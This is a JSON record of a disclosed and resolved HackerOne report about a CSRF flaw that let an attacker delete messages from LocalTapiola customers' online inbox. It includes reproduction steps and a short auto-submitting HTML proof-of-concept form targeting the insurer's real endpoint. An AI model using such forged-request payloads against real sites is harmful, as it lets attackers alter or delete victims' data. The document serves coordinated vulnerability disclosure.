{
  "id": 123339,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjMzMzk=",
  "url": "https://hackerone.com/reports/123339",
  "title": "CSRF allows attacker to delete item from customer's \"Postilaatikko\"",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2016-03-15T14:40:27.284Z",
  "submitted_at": "2016-03-15T14:40:27.284Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "putsi",
    "url": "/putsi",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/044/111/aa19edadf036d52f4b00a706913bf4d957a21d3d_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 8416,
    "url": "https://hackerone.com/localtapiola",
    "handle": "localtapiola",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "LocalTapiola",
      "twitter_handle": "",
      "website": "http://www.lahitapiola.fi",
      "about": "LocalTapiola’s products and services cover non-life, life and pension insurance, as well as investment and saving services."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-02-25T12:15:34.593Z",
  "bug_reporter_agreed_on_going_public_at": "2017-02-25T12:15:34.563Z",
  "team_member_agreed_on_going_public_at": "2017-02-25T11:33:22.828Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Description\nIf the customer navigates to the CSRF-attack page shortly after viewing any message details on the \"Postilaatikko\", the last item that was viewed by the customer will be deleted.\nPlease see the attached video for an illustration of the bug.\n\n## Steps to reproduce\n1. Log in to the Lähitapiola.\n2. Navigate to \"Vakuutukset\" --> \"Postilaatikko\".\n3. Open the details page of e.g. \"Asiakastietomuutos\"-message.\n4. (optional) Navigate to any other page of Lähitapiola-website or click the \"Takaisin postilaatikkoon\"-button.\n5. Open the CSRF-attackpage.\n6. Notice that the message was deleted due to the CSRF-request.\n\n## Proof of concept\n```\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n    <form action=\"https://verkkopalvelu.tapiola.fi/a2/AsiakassalkkuWeb/naytaviestiketju.do\">\n      <input type=\"hidden\" name=\"mn\" value=\"p\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n```",
  "weakness": {
    "id": 45,
    "name": "Cross-Site Request Forgery (CSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-03-27T11:33:22.872Z",
  "allow_singular_disclosure_after": -217211324.77847663,
  "singular_disclosure_allowed": true,
  "vote_count": 16,
  "voters": [
    "delimitry",
    "tk0",
    "hsalo",
    "shubham_srt",
    "its_afolic",
    "madrobot",
    "mpz",
    "eveeez",
    "arnonymous",
    "ak1t4",
    "and 6 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 4.3,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "none",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 1047,
    "asset_type": "URL",
    "asset_identifier": "verkkopalvelu.tapiola.fi",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 3449,
      "category": "team",
      "content": "##Issue\nThe reporter was able to remove items from the customer inbox due to missing CSRF-token protection. The exploit required the user (victim) to have a valid and active session in the service.\n\n##Fix\n\nThe application was fixed.\n\n##Reasoning\n\nCSRF can potentially be very serious. In this case, the impact was limited in many ways due to the fact that the attacker needed the victim to have an active session and that the victim was recently active in his/her customer inbox.",
      "user": {
        "id": 60017,
        "username": "localtapiola-thomas",
        "name": "localtapiola-thomas",
        "bio": "LocalTapiola Bug Bounty Coordinator - @tsmalmbe",
        "cleared": false,
        "verified": false,
        "website": "http://www.lahitapiola.fi",
        "location": "Espoo, Finland",
        "created_at": "2016-03-09T13:58:17.117Z",
        "url": "https://hackerone.com/localtapiola-thomas",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
